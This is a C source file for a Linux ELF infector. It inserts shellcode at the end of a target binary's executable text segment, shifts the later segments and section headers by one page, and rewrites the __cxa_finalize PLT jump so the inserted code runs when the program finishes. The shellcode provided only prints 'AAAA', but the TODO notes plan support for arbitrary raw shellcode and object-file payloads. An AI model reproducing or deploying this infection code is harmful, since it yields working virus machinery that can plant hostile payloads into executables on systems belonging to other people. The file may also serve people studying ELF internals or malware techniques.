#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <stdint.h>
#include <errno.h>
#include <sys/mman.h>
#include <dirent.h>
#include <elf.h>

#include <auxvector.h>

/* TODO
 * - Custom parasite infection:
 *   * raw shellcode
 *   * object file
 *
 */

#define SHELLCODE_LEN       43
#define SHELLCODE_JMP_OFFT  37

uint64_t PAGE_SIZE = 0; 
uint8_t dummy_shellcode[SHELLCODE_LEN] = {
  0x57,                                         // push rdi
  0x48, 0xb8, 0x41, 0x41, 0x41, 0x41, 0x0a,     // movabs rax, 0xa41414141
  0x00, 0x00, 0x00,
  0x50,                                         // push rax
  0xb8, 0x01, 0x00, 0x00, 0x00,                 // mov eax, 1
  0xbf, 0x01, 0x00, 0x00, 0x00,                 // mov edi, 1
  0x48, 0x89, 0xe6,                             // mov rsi, rsp
  0xba, 0x05, 0x00, 0x00, 0x00,                 // edx, 5
  0x0f, 0x05,                                   // syscall
  0x48, 0x83, 0xc4, 0x08,                       // add rsp, 8
  0x5f,                                         // pop rdi
  0xff, 0x25, 0x00, 0x00, 0x00, 0x00,           // jmp QWORD PTR [rip + ?]
};

uint8_t jump[5] = {
    0xe9, 0x44, 0x01, 0x00, 0x00,
};

struct parasite_host {
    union {
        Elf64_Ehdr *elf;
        uint8_t *bytes;
    };
    size_t size;

    Elf64_Phdr *phdrs;
    Elf64_Shdr *shdrs;
    Elf64_Shdr *plt_got;
    Elf64_Sym *dyn_sym;
    Elf64_Rela *rela_dyn;
    size_t no_rela_dyn;
    char *dyn_str;
    uint8_t *jmp_to_payload;

    uint8_t *scratch_space;
};

static int found_auxvector_64(struct aux_entry_64 *stack_addr)
{
    int i;
    for (i=0;i<AUXVLEN64;i++)
        if (stack_addr[i].id != aux_order[i]) return 0;
    return 1;
}

/* st_addr_int and max_addr are stack addresses designating the scan
 * boundaries. An address of any local variable would do. st_addr_int
 * is QWORD aligned before the search begins.
 */
static struct aux_entry_64 *get_auxvector(uint64_t st_addr_int, uint64_t max_addr)
{
    uint64_t *st_addr = (uint64_t *)(st_addr_int & QWORD_ALIGN);
    // adjust the upper boundary
    max_addr -= SCAN_VECTOR_SIZE64;
    for (; (uint64_t)st_addr < max_addr; st_addr++) {
        if (found_auxvector_64((struct aux_entry_64 *)st_addr))
            return (struct aux_entry_64 *)st_addr;
    }
    return NULL;
}

static int map_host(const char *path, struct parasite_host *host)
{
    if (!path || !host) {
        fprintf(stderr, "map_host: Invalid argument\n");
        return -1;
    }

    int elf_fd;
    struct stat elf_stat;

    memset(&elf_stat, 0, sizeof(struct stat));

    if ((elf_fd = open(path, O_RDWR)) == -1) {
        fprintf(stderr, "open: %s\n", strerror(errno));
        return -1;
    }

    if (fstat(elf_fd, &elf_stat) == -1) {
        fprintf(stderr, "fstat: %s\n", strerror(errno));
        return -1;
    }

    if (ftruncate(elf_fd, elf_stat.st_size+PAGE_SIZE) == -1) {
        fprintf(stderr, "ftruncate: %s\n", strerror(errno));
        return -1;
    }

    host->bytes = mmap(NULL, elf_stat.st_size+PAGE_SIZE,
                       PROT_READ | PROT_WRITE,
                       MAP_SHARED,
                       elf_fd, 0);

    if (host->bytes == MAP_FAILED) {
        fprintf(stderr, "mmap: %s\n", strerror(errno));
        return -1;
    }

    host->size = elf_stat.st_size;

    close(elf_fd);

    host->phdrs = (Elf64_Phdr *)(host->bytes + host->elf->e_phoff);
    printf("[DEBUG] Program Headers @%p\n", host->phdrs);
    host->shdrs = (Elf64_Shdr *)(host->bytes + host->elf->e_shoff);
    printf("[DEBUG] Section Headers @%p\n", host->shdrs);

    host->scratch_space = mmap(NULL, host->size,
                          PROT_WRITE | PROT_READ,
                          MAP_ANONYMOUS | MAP_PRIVATE,
                          -1, 0);

    if (host->scratch_space == MAP_FAILED) {
        fprintf(stderr, "mmap: %s\n", strerror(errno));
        munmap(host->bytes, elf_stat.st_size+PAGE_SIZE);
        return -1;
    }

    return 0;
}

static void unmap_host(struct parasite_host *host)
{
    if (host) {
        if (host->bytes)
            munmap(host->bytes, host->size+PAGE_SIZE);

        if (host->scratch_space)
            munmap(host->scratch_space, host->size);
    }
}

static int find_sections(struct parasite_host *host)
{
    if (!host || !host->elf) {
        fprintf(stderr, "find_sections: Invalid argument\n");
        return -1;
    }

    Elf64_Half i;
    char *section_strtab;

    Elf64_Shdr *sh_strtab = &host->shdrs[host->elf->e_shstrndx];
    section_strtab = (char *)((uint64_t)host->elf+ (uint64_t)sh_strtab->sh_offset);

    for (i = 0; i < host->elf->e_shnum; i++) {
        switch (host->shdrs[i].sh_type) {
        case SHT_DYNSYM:
        host->dyn_sym = (Elf64_Sym *)((uint64_t)host->elf +
                                      (uint64_t)host->shdrs[i].sh_offset);
        break;

        case SHT_PROGBITS:
        if (!memcmp(section_strtab+host->shdrs[i].sh_name, ".plt.got", 9))
            host->plt_got = &host->shdrs[i];
        break;

        case SHT_RELA:
        if (!memcmp(section_strtab+host->shdrs[i].sh_name, ".rela.dyn", 10)) {
            host->rela_dyn = (Elf64_Rela *)((uint64_t)host->elf +
                                            (uint64_t)host->shdrs[i].sh_offset);
            host->no_rela_dyn = host->shdrs[i].sh_size/sizeof(Elf64_Rela);
        }
        break;

        case SHT_STRTAB:
        if (!memcmp(section_strtab+host->shdrs[i].sh_name, ".dynstr", 8))
            host->dyn_str = (char *)((uint64_t)host->elf +
                                     (uint64_t)host->shdrs[i].sh_offset);
        break;
        }
    }

    if (!host->dyn_sym || !host->plt_got || !host->rela_dyn || !host->dyn_str) {
        fprintf(stderr, "find_sections: Candidate host missing a required section\n");
        return -1;
    }
    printf("[DEBUG] .dyn.sym\t@%p\n", host->dyn_sym);
    printf("[DEBUG] .rela.dyn\t@%p\n", host->rela_dyn);
    printf("[DEBUG] No relocs\t%ld\n", host->no_rela_dyn);
    printf("[DEBUG] .plt.got\t@%p\n", host->plt_got);
    printf("[DEBUG] .dyn.str\t@%p\n", host->dyn_str);
    return 0;
}

static int find_cxafin(struct parasite_host *host)
{
    uint64_t i;
    Elf64_Sym sym_it;
    uint8_t *cxafin_bytes = NULL,
            *plt_got = (uint8_t *)((uint64_t)host->elf +
                                             host->plt_got->sh_offset);
    uint32_t saved_offt;

    for (i=0; i < host->no_rela_dyn; i++) {
        sym_it = host->dyn_sym[ELF64_R_SYM(host->rela_dyn[i].r_info)];

        if (!memcmp(&host->dyn_str[sym_it.st_name], "__cxa_finalize", 15)) {
            cxafin_bytes = (uint8_t *)((uint64_t)host->elf +
                                                 host->rela_dyn[i].r_offset);
            break;
        }
    }

    if (!cxafin_bytes) return -1;

    printf("[DEBUG] __cxa_finalize\t@%p\n", cxafin_bytes);

    for (i=0; i < host->plt_got->sh_size; i++) {
        if (plt_got[i] == 0xff && plt_got[i+1] == 0x25) {
            saved_offt = *(uint32_t *)&plt_got[i+2];
            if (cxafin_bytes == (&plt_got[i+6] + saved_offt)) {
                printf("[DEBUG] code offset:\t0x%x\n", saved_offt);
                memcpy(&dummy_shellcode[SHELLCODE_JMP_OFFT], &plt_got[i], 5);
                host->jmp_to_payload = &plt_got[i];
                return 0;
            }
        }
    }
    return -1;
}

static int mamma_mia(struct parasite_host *host)
{
    uint64_t i,j;
    uint64_t bytes_after_text;
    Elf64_Addr infect_vaddr = 0;
    uint8_t *end_of_text;

    for (i=0; i < host->elf->e_phnum; i++) {
        if (host->phdrs[i].p_type == PT_LOAD) {
            if (host->phdrs[i].p_flags & PF_X) {
                end_of_text = host->bytes +
                              host->phdrs[i].p_offset+host->phdrs[i].p_filesz;

                infect_vaddr = host->phdrs[i].p_vaddr +
                               host->phdrs[i].p_memsz;

                bytes_after_text = (host->size -
                                    host->phdrs[i].p_offset -
                                    host->phdrs[i].p_filesz);

                host->phdrs[i].p_filesz += SHELLCODE_LEN;
                host->phdrs[i].p_memsz += SHELLCODE_LEN;
                for (j=i+1; j < host->elf->e_phnum; j++) {
                    if (host->phdrs[j].p_offset > host->phdrs[i].p_offset)
                        host->phdrs[j].p_offset += PAGE_SIZE;
                }
            }
        }
    }

    for (i=0; i < host->elf->e_shnum; i++) {
        if (host->shdrs[i].sh_offset > infect_vaddr) {
            host->shdrs[i].sh_offset += PAGE_SIZE;
        }

        if (infect_vaddr == (host->shdrs[i].sh_addr + host->shdrs[i].sh_size)) {
            host->shdrs[i].sh_size += SHELLCODE_LEN;
        }
    }

    uint32_t *rel_cxa_finalize = (uint32_t *)&dummy_shellcode[SHELLCODE_JMP_OFFT+2];
    *rel_cxa_finalize -= (((uint64_t)end_of_text+SHELLCODE_LEN-6) -
                          (uint64_t)host->jmp_to_payload);

    memcpy(host->scratch_space, end_of_text, bytes_after_text);
    memcpy(end_of_text, dummy_shellcode, SHELLCODE_LEN);
    memcpy(end_of_text+PAGE_SIZE, host->scratch_space, bytes_after_text);
    host->elf->e_shoff += PAGE_SIZE;

    uint32_t offt = (uint32_t) ((uint64_t)end_of_text -
                               ((uint64_t)host->jmp_to_payload+5));
    *(uint32_t *)&jump[1] = offt;
    memcpy(host->jmp_to_payload, jump, 5);

    return 0;
}

int main(int argc, char **argv)
{
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <parasite> <parasite host>\n", argv[0]);
        return 1;
    }

    struct parasite_host host;
    struct aux_entry_64 *aux;
    uint64_t stack;

    __asm__ volatile (
        "mov %%rsp, %0"
        : "=r" (stack)
        :
    );

    if (!(aux = get_auxvector(stack, 0x7ffffffff000))) {
        fprintf(stderr, "get_auxvector: could not find the aux vector\n");
        return 2;
    };

    PAGE_SIZE = aux[AT_PAGESZ_ORD].val;

    printf("[DEBUG] Page size:\t%ld\n", PAGE_SIZE);

    memset(&host, 0, sizeof(struct parasite_host));

    if (map_host(argv[2], &host) == -1) {
        fprintf(stderr, "map_host: failed to map the parasite host\n");
        return 3;
    }

    if (find_sections(&host) == -1) {
        fprintf(stderr, "find_sections: failed to find required sections\n");
        goto free_exit;
    }

    if (find_cxafin(&host) == -1) {
        fprintf(stderr, "find_cxafin: failed to locate __cxa_finalize()\n");
        goto free_exit;
    };

    mamma_mia(&host);
free_exit:
    unmap_host(&host);
    return 0;
}
